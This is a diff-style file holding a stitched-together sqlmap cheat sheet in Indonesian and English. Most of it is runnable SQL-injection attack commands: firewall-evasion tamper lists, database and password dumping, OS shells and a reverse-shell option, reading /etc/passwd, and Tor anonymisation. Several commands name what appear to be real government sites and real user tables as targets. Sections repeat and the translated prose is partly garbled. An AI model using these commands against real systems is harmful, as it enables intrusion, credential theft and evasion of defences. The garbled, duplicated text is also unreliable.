+--tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+```
+# General scripts
+```
+--tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
+```
+# Microsoft access
+```
+--tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+```
+# Microsoft SQL Server
+```
+--tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
+```
+# MySQL
+```
+--tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+```
+# Oracle
+```
+--tamper=between,charencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,xforwardedfor
+```
+# PostgreSQL
+```
+--tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,xforwardedfor
+```
+# SAP MaxDB
+```
+--tamper=ifnull2ifisnull,nonrecursivereplacement,randomcase,securesphere,space2comment,space2plus,unionalltounion,unmagicquotes,xforwardedfor
+```
+# SQLite
+```
+--tamper=ifnull2ifisnull,multiplespaces,nonrecursivereplacement,randomcase,securesphere,space2comment,space2dash,space2plus,unionalltounion,unmagicquotes,xforwardedfor
+```
+penggunaan > python2 sqlmap.py -u "https://divhubinter.polri.go.id/dhi/viewBerita.php?id=13" --dbs --random-agent --level 5 -v 3 --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+
+
+# dan sedikit tambahan bagi kita semua :')
+
+1. Permintaan POST
+Kami dapat menyediakan data yang sedang diteruskan di badan permintaan POST untuk dipindai dengan alat SQLMap.
+
+sqlmap -u http://site-to-test.com/admin/index.php –data = ”user = admin & password = admin” -p pengguna
+
+–Data = data POST
+
+2. DAPATKAN Permintaan
+sqlmap -u http://site-to-test.com/test.php?id=1 -p id
+
+sqlmap -u http://site-to-test.com/test.php?id=1 *
+
+-u: URL untuk dipindai
+
+-p: parameter yang akan dipindai
+
+*: Parameter yang akan dipindai (jika sakelar -p tidak tersedia)
+
+3. Memindai Halaman Login POST
+Halaman login posting diotorisasi oleh header cookie, yang diteruskan di header HTTP dari permintaan GET / POST. Untuk memindai halaman login posting, kita harus menyediakan cookie yang valid ke SQLMap.
+
+sqlmap -u http://192.168.202.163/admin/index.php?id=1 –cookie = ”nilai cookie”
+
+/admin/index.php?id=1 adalah halaman login posting.
+
+4. CRAWL /MERANGKAK/MESUM
+
+Perayapan adalah opsi penting yang memungkinkan alat SQLMap merayapi situs web, mulai dari lokasi root. Kedalaman crawl dapat ditentukan di perintah.
+
+sqlmap -u http://192.168.202.160/ –crawl = 1
+
+–Crawl : Menentukan kedalaman untuk dirayapi. (Contoh: Mendefinisikan 2 akan memungkinkan alat untuk merayapi hingga dua direktori)
+
+Jika kami ingin mengecualikan halaman apa pun dari cakupan crawler, kami dapat menentukan dengan –crawl-exclude. Ini adalah opsi yang berguna saat kami merayapi halaman login posting.
+
+sqlmap -u http://192.168.202.163/ –crawl = 3 –cookie = "nilai cookie " –crawl-exclude = "logout"
+
+Perintah ini akan merayapi situs web hingga tiga direktori dan mengecualikan URL apa pun yang memiliki kata kunci "logout"
+
+5. Perintah batch digunakan untuk sesi non-interaktif. Saat kami mencoba memindai sesuatu, SQLMap mungkin meminta kami untuk memberikan masukan selama pemindaian: misalnya, saat menggunakan fitur perayapan, alat tersebut menanyakan pengguna apakah pengguna ingin memindai URL yang diidentifikasi. Ketika –batch didefinisikan dalam perintah, pahat menggunakan nilai default untuk melanjutkan tanpa bertanya kepada pengguna.
+
+URL halaman dengan kolom formulir (katakanlah halaman login) dapat diberikan bersama dengan opsi –form untuk mengurai halaman dan memandu pengguna untuk menguji kolom yang diidentifikasi.
+
+ python2 sqlmap.py -u http://www.nz3666Gho5t.to/admin/login.php --form
+
+
+Sekarang halaman dengan sejumlah besar kolom formulir dapat diuji secara efektif menggunakan opsi –form dan –batch bersamaan. Ini akan mengurai halaman dan memeriksa kolom formulir dan secara otomatis memberikan masukan atas nama pengguna.
+
+Jika seluruh aplikasi harus dipindai, opsi perayapan bersama dengan formulir dan sakelar dapat digunakan
+
+ python2 sqlmap.py -u http://www.nz3666Gho5t.to/admin/login.php --form --batch
+ 
+6. Verbose
+Jika kami ingin melihat payload dikirim oleh alat, kami dapat menggunakan opsi verbose. Nilainya berkisar dari 1 hingga 6.
+
+ python2 sqlmap.py -u http://www.nz3666Gho5t.to/cat.php?id=2 -v 3
+
+7. Database Enumeration
+
+Seperti yang kita ketahui SQLMap sebagian besar digunakan untuk eksploitasi injeksi SQL, mari kita lihat beberapa perintah untuk menghitung database melalui aplikasi yang rentan terhadap injeksi SQL.
+
+1. –dbs: Opsi ini digunakan untuk menghitung database.
+
+ python2 sqlmap.py -u http://www.nz3666Gho5t.to/gallery.php?id=666 --dbs
+
+8. Bypassing WAF Using Tamper Script
+
+Seringkali, kami menemukan skenario di mana aplikasi disimpan di belakang firewall aplikasi web (WAF). Untuk memeriksa apakah situs tersebut dilindungi oleh WAF, kita dapat menggunakan opsi berikut:
+
+–Identifikasikan-waf
+
+Setelah WAF teridentifikasi, kita dapat menggunakan skrip tamper untuk menyerang aplikasi yang dilindungi WAF. Skrip gangguan dapat mengubah permintaan untuk keluar dari deteksi WAF. Skrip dapat ditemukan di directory
+
+$cd sqlmap
+$ls
+$cd tamper
+
+9. Running System Commands / kek into outfile
+
+Kita dapat menjalankan perintah OS / tingkat sistem jika pengguna database saat ini memiliki hak DBA. Kami dapat menggunakan opsi berikut:
+
+Untuk server Linux:
+
+sqlmap -u http://nz3666ghost/cat.php?id=1 –os-shell
+
+Untuk server Windows:
+
+sqlmap -u http://www.nz3666ghost.to/cat.php?id=1 –os-cmd <cmd>
+
+10. Menjalankan Kueri SQL
+
+Kita dapat menjalankan pernyataan SQL pada database dengan menjalankan perintah berikut:
+
+sqlmap -u nz3666ghost.to/cat.php?id=2 –sql-shell
+
+Pilihan lain
+Beberapa opsi lain termasuk:
+
+1. Memindai halaman yang dilindungi oleh otentikasi HTTP seperti Basic, NTLM dan Digest:
+
+sqlmap -u http://example.com/admin.aspx –auth-type Basic –auth-cred “admin: admin”
+
+2. Memindai halaman yang dilindungi oleh otentikasi berbasis kunci
+
+sqlmap -u http://example.com/admin.aspx - auth-file = <jalur ke sertifikat PEM atau file kunci pribadi>
+
+3. Untuk mengacak IP penyerang (ini dapat membantu dalam kasus seperti deteksi WAF, atau ketika menyembunyikan sumber penyerang akan meningkatkan kesulitan melacak IP).
+
+Untuk menggunakan jaringan anonimitas Tor default:
+
+sqlmap -u http://example.com/admin.aspx –tor
+
+Untuk menentukan port Tor:
+
+sqlmap -u http://example.com/admin.aspx –tor-port = <tor proxy port>
+
+4. Jika penundaan diperlukan di antara setiap permintaan HTTP:
+
+sqlmap -u http://example.com/admin.aspx –delay = penundaan 1 # 1 detik
+
+5. Jika halaman dilindungi oleh token CSRF, kita dapat memasukkannya ke dalam perintah:
+
+sqlmap -u http://example.com/admin.aspx –csrf-token = <csrf token>
+
+6.
+Injeksi SQL Orde Kedua: Dalam jenis injeksi SQL ini, muatan SQL disimpan dalam database dan diambil nanti saat mengakses halaman yang berbeda. Kami menyediakan URL, yang akan diminta oleh alat SQLMap setelah setiap injeksi. Kita dapat menginstruksikan alat SQLMap untuk menguji injeksi ini dengan menggunakan perintah berikut:
+
+sqlmap -r /root/Desktop/Burp.txt –second -order “http: //target/vulnerbalepage.php”
+
+File Burp.txt berisi permintaan injeksi mana yang akan dilakukan.
+
+–Second-order “URL” berisi URL yang akan diakses oleh SQLMap setelah setiap injeksi.
+$ cd /storage/190C-1BF4                                               $ cd sqlmap                                                           $ cd sqlmap
+$ ls
+COMMITMENT  data   lib          sqlmap.py     thirdparty
+LICENSE     doc    plugins      sqlmapapi.py
+README.md   extra  sqlmap.conf  tamper
+$ Usage: python2 sqlmap.py [options]
+
+Options:
+  -h, --help            Show basic help message and exit
+  -hh                   Show advanced help message and exit
+  --version             Show program's version number and exit
+  -v VERBOSE            Verbosity level: 0-6 (default 1)
+
+  Target:
+    At least one of these options has to be provided to define the
+    target(s)
+
+    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
+    -g GOOGLEDORK       Process Google dork results as target URLs
+
+  Request:
+    These options can be used to specify how to connect to the target URL
+
+    --data=DATA         Data string to be sent through POST (e.g. "id=1")
+    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
+    --random-agent      Use randomly selected HTTP User-Agent header value
+    --proxy=PROXY       Use a proxy to connect to the target URL
+    --tor               Use Tor anonymity network
+    --check-tor         Check to see if Tor is used properly
+
+  Injection:
+    These options can be used to specify which parameters to test for,
+    provide custom injection payloads and optional tampering scripts
+
+    -p TESTPARAMETER    Testable parameter(s)
+    --dbms=DBMS         Force back-end DBMS to provided value
+
+  Detection:
+    These options can be used to customize the detection phase
+
+    --level=LEVEL       Level of tests to perform (1-5, default 1)
+    --risk=RISK         Risk of tests to perform (1-3, default 1)
+
+  Techniques:
+    These options can be used to tweak testing of specific SQL injection
+    techniques
+    
+    
+    eum sedikit lagi cara install sqlmap tanpa cloningan github :v
+    
+    python3
+    - apt install python
+    - pip install requests
+    - pip install sqlmap
+    - sqlmap
+    
+    python2
+    - apt install python2
+    - pip2 install requests
+    - pip install sqlmap
+    - sqlmap
+     
+     - crawl web
+     python2 sqlmap.py -u "https://divhubinter.polri.go.id" --crawl=1 --forms
+     
+     --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
+    
+    Generic
+-u "<URL>" 
+-p "<PARAM TO TEST>" 
+--user-agent=SQLMAP 
+--random-agent 
+--threads=10 
+--risk=3 #MAX
+--level=5 #MAX
+--dbms="<KNOWN DB TECH>" 
+--os="<OS>"
+--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
+--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
+--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
+--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
+--proxy=http://127.0.0.1:8080
+--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
+Retrieve Information
+Internal
+--current-user #Get current user
+--is-dba #Check if current user is Admin
+--hostname #Get hostname
+--users #Get usernames od DB
+--passwords #Get passwords of users in DB
+--privileges #Get privileges
+DB data
+--all #Retrieve everything
+--dump #Dump DBMS database table entries
+--dbs #Names of the available databases
+--tables #Tables of a database ( -D <DB NAME> )
+--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
+-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
+Injection place
+From Burp/ZAP capture
+Capture the request and create a req.txt file
+sqlmap -r req.txt --current-user
+GET Request Injection
+sqlmap -u "http://example.com/?id=1" -p id
+sqlmap -u "http://example.com/?id=*" -p id
+POST Request Injection
+sqlmap -u "http://example.com" --data "username=*&password=*"
+Injections in Headers and other HTTP Methods
+#Inside cookie
+sqlmap  -u "http://example.com" --cookie "mycookies=*"
+
+#Inside some header
+sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
+sqlmap -u "http://example.com" --headers="referer:*"
+
+#PUT Method
+sqlmap --method=PUT -u "http://example.com" --headers="referer:*"
+
+#The injection is located at the '*'
+Indicate string when injection is successful
+--string="string_showed_when_TRUE" 
+Shell
+#Exec command
+python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami
+
+#Simple Shell
+python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell
+
+#Dropping a reverse-shell / meterpreter
+python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
+Read File
+--file-read=/etc/passwd
+Crawl a website with SQLmap and auto-exploit
+sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
+
+--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
+--crawl = how deep you want to crawl a site
+--forms = Parse and test forms
+Second Order Injection
+python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
+sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
+Read this post about how to perform simple and complex second order injections with sqlmap.
+Customizing Injection
+Set a suffix
+python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
+Prefix
+python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
+Help finding boolean injection
+# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
+sqlmap -r r.txt -p id --not-string ridiculous --batch
+Tamper
+Remember that you can create your own tamper in python and it's very simple. You can find a tamper example in the Second Order Injection page here.
+--tamper=name_of_the_tamper
+#In kali you can see all the tampers in /usr/share/sqlmap/tamper
+
+rawl a website with SQLmap and auto-exploit
+sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
+​
+--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
+--crawl = how deep you want to crawl a site
+--forms = Parse and test forms
+Second Order Injection
+python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
+sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
+​Read this post about how to perform simple and complex second order injections with sqlmap.
+
+Customizing Injection
+Set a suffix
+python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
+Prefix
+python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
+Help finding boolean injection
+# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
+sqlmap -r r.txt -p id --not-string ridiculous --batch
+Tamper
+Remember that you can create your own tamper in python and it's very simple. You can find a tamper example in the Second Order Injection page here.
+
+--tamper=name_of_the_tamper
+#In kali you can see all the tampers in /usr/share/sqlmap/tamper
+Tamper
+
+Description
+
+apostrophemask.py
+
+Replaces apostrophe character with its UTF-8 full width counterpart
+
+apostrophenullencode.py
+
+Replaces apostrophe character with its illegal double unicode counterpart
+
+appendnullbyte.py
+
+Appends encoded NULL byte character at the end of payload
+
+base64encode.py
+
+Base64 all characters in a given payload
+
+between.py
+
+Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #'
+
+bluecoat.py
+
+Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator
+
+chardoubleencode.py
+
+Double url-encodes all characters in a given payload (not processing already encoded)
+
+commalesslimit.py
+
+Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'
+
+commalessmid.py
+
+Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'
+
+concat2concatws.py
+
+Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'
+
+charencode.py
+
+Url-encodes all characters in a given payload (not processing already encoded)
+
+charunicodeencode.py
+
+Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded). "%u0022"
+
+charunicodeescape.py
+
+Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded). "\u0022"
+
+equaltolike.py
+
+Replaces all occurances of operator equal ('=') with operator 'LIKE'
+
+escapequotes.py
+
+Slash escape quotes (' and ")
+
+greatest.py
+
+Replaces greater than operator ('>') with 'GREATEST' counterpart
+
+halfversionedmorekeywords.py
+
+Adds versioned MySQL comment before each keyword
+
+ifnull2ifisnull.py
+
+Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'
+
+modsecurityversioned.py
+
+Embraces complete query with versioned comment
+
+modsecurityzeroversioned.py
+
+Embraces complete query with zero-versioned comment
+
+multiplespaces.py
+
+Adds multiple spaces around SQL keywords
+
+nonrecursivereplacement.py
+
+Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters
+
+percentage.py
+
+Adds a percentage sign ('%') infront of each character
+
+overlongutf8.py
+
+Converts all characters in a given payload (not processing already encoded)
+
+randomcase.py
+
+Replaces each keyword character with random case value
+
+randomcomments.py
+
+Add random comments to SQL keywords
+
+securesphere.py
+
+Appends special crafted string
+
+sp_password.py
+
+Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs
+
+space2comment.py
+
+Replaces space character (' ') with comments
+
+space2dash.py
+
+Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')
+
+space2hash.py
+
+Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')
+
+space2morehash.py
+
+Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')
+
+space2mssqlblank.py
+
+Replaces space character (' ') with a random blank character from a valid set of alternate characters
+
+space2mssqlhash.py
+
+Replaces space character (' ') with a pound character ('#') followed by a new line ('\n')
+
+space2mysqlblank.py
+
+Replaces space character (' ') with a random blank character from a valid set of alternate characters
+
+space2mysqldash.py
+
+Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n')
+
+space2plus.py
+
+Replaces space character (' ') with plus ('+')
+
+space2randomblank.py
+
+Replaces space character (' ') with a random blank character from a valid set of alternate characters
+
+symboliclogical.py
+
+Replaces AND and OR logical operators with their symbolic counterparts (&& and
+
+unionalltounion.py
+
+Replaces UNION ALL SELECT with UNION SELECT
+
+unmagicquotes.py
+
+Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work)
+
+uppercase.py
+
+Replaces each keyword character with upper case value 'INSERT'
+
+varnish.py
+
+Append a HTTP header 'X-originating-IP'
+
+versionedkeywords.py
+
+Encloses each non-function keyword with versioned MySQL comment
+
+versionedmorekeywords.py
+
+Encloses each keyword with versioned MySQL comment
+
+xforwardedfor.py
+
+Append a fake HTTP header 'X-Forwarded-For'
+
+- Burpsuite Sqlmap
+
+sqlmap -r target -p username
+
+sqlmap -r target -p username --dump --batch
+
+
+- Bypass Waf Mod Security
+
+--random-agent --tamper=modsecurityversioned --level=3 --risk=3 -v 3 --dbs --batch
+
+- Bypass Waf & Tamper Script
+
+--level=5 --skip-waf --dbs --batch
+
+--level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
+--dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" --dbs
+--dbms="MySQL" -v3 --technique U --tamper="space2comment" --dbs
+-v3 --technique=T --no-cast --fresh-queries --banner
+sqlmap -u http://www.********?id=1 --level 2 --risk 3 --batch --dbs
+
+
+-f -b --current-user --current-db --is-dba --users --dbs
+
+--risk=3 --level=5 --random-agent --user-agent -v3 --batch --threads=10 --dbs
+
+--risk 3 --level 5 --random-agent --proxy http://123.57.48.140:8080 --dbs
+
+--random-agent --dbms=MYSQL --dbs --technique=B"
+
+--identify-waf --random-agent -v 3 --dbs
+
+1 : --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --dbs
+2 : --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3
+
+--threads=10 --dbms=MYSQL --tamper=apostrophemask --technique=E -D joomlab -T anz91_session -C session_id --dump
+
+--tables -D miss_db --is-dba --threads="10" --time-sec=10 --timeout=5 --no-cast --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent
+
+sqlmap.py -u http://192.168.0.107/test.php?id=1 -v 3 --dbms "MySQL" --technique U -p id --batch --tamper "space2morehash.py"
+
+--banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2
+-v3 --dbms="MySQL" --risk=3 --level=3 --technique=BU --tamper="space2mysqlblank.py" --random-agent -D damksa_abr -T admin,jobadmin,member --columns --batch
+
+C:\Python27\python.exe sqlmap.py --wizard
+
+--level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql
+
+
+sqlmap.py -url www.site.ps/index.php --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql
+
+sqlmap.py -url www.site.ps/index.php --level 5 --risk 3 tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql
+
+
+sqlmap.py -url www.site.ps/index.php --level 5 --risk 3 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql
+
+
+--level=5 --risk=3 -p "id" –-tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords"
+
+sqlmap -u ‘http://www.site.com:80/search.cmd?form_state=1’ –level=5 –risk=3 -p ‘item1’ –tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+
+
+--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent
+
+--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" --tables
+
+--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" --columns
+
+--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" -C "ud,email,usuario,contra" --dump
+
+tamper=between.py,charencode.py,charunicodeencode.py,equaltolike.py,greatest.py,multiplespaces.py,nonrecursivereplacement.py,percentage.py,randomcase.py,securesphere.py,sp_password.py,space2comment.py,space2dash.py,space2mssqlblank.py,space2mysqldash.py,space2plus.py,space2randomblank.py,unionalltounion.py,unmagicquotes.py --dbms=mssql
+
+#Bypass WAF SQLMAP
+
+Example:
+-sqlmap -u "Target.com" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --dbs
+-sqlmap -u "Target.com" --identify-waf --random-agent -v 3 --dbs
+-sqlmap -u "Target.com" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --level=5 --risk=3 --dbs
+-sqlmap -u "http://sitetarget.com/login" --data="userid=admin&passwd=admin" --method POST --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --level=5 --risk=3 --dbs
+
+# Bypass 403 Forbidden
+-v3 --dbms="MySql" --risk=3 --level=3 --technique=BU --tamper="space2mysqlblank.py" --random-agent --dbs --no-cast --batch
+
+*Bypass 406 ( Not Acceptable )
+ --level 5 --dbs --random-agent -v 3 --batch
+ 
+ *Bypass 500 ( Internal server error )
+ --dbs --tamper=modsecurityzeroversioned -v 3 --batch
+ bypass dump table 500
+  --dbs --tamper=modsecurityzeroversioned,multiplespaces.py -v 3 --batch
+ 
+ Crawl the page:
+
+sqlmap -u http://.. --dbms=mysql --crawl=3
+
+sqlmap -u http://<targetip> --forms --batch --crawl=10 --cookie=jsessionid=54321 --level 4 --risk 3
+
+-------------------------------------------------------------------
+Specify parameter in the saved request file:
+
+sqlmap -r login.req -p Password --dbms=mssql -v 3  --batch --level 5 --risk 3
+
+-------------------------------------------------------------------
+List DBs:
+
+sqlmap -r request.txt --level 4 --risk 3 --dbms=mysql --batch -p <parameter> --dbs
+
+-------------------------------------------------------------------
+List tables:
+
+sqlmap -r request.txt --level 4 --risk 3 --dbms=mysql --batch -p <parameter> -D <dbname> --tables
+
+--------------------------------------------------------------------
+Dump column data:
+
+sqlmap -r request.txt --level 4 --risk 3 --dbms=mysql --batch -p <parameter> -D <dbname> -T <tables> --dump
+
+--------------------------------------------------------------------
+Force usage of SSL/HTTPS:
+
+python sqlmap.py -r a.req --force-ssl --users
+
+--------------------------------------------------------------------
+
+#Error Based ( POST data )
+python2 sqlmap.py -u "https://sijaka.tangerangkab.go.id/Masuk/login" --data="email=omest&password=omest" --method POST --dbs --batch
+ 
+ #Error based ( parameter )
+ --banner --dbs --batch
+ 
+! byp4ss firewall POST method
+ 
+ python2 sqlmap.py -v 2 -o --level 5 --threads 10 --risk 3 --sqlmap-shell --random-agent --drop-set-cookie --tamper xforwardedfor,varnish,randomcase,multiplespaces -r game.txt
